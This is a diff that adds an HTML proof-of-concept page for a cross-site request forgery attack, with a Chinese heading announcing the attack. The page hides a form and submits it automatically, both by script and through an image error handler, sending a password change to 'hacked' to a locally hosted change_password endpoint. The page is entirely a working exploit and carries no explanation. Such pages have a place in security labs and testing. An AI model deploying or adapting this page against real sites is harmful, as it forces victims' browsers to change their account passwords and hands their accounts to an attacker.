@@ -1,0 +1,11 @@
+<html>
+  <body>
+    <h1>点击下方链接，触发CSRF攻击</h1>
+    <!-- 自动提交表单（可配合图片触发） -->
+    <img src="x" onerror="document.forms[0].submit()" style="display:none;">
+    <form id="attack" method="POST" action="http://127.0.0.1:5000/change_password">
+      <input type="hidden" name="new_password" value="hacked">
+    </form>
+    <script>document.getElementById('attack').submit();</script>
+  </body>
+</html>
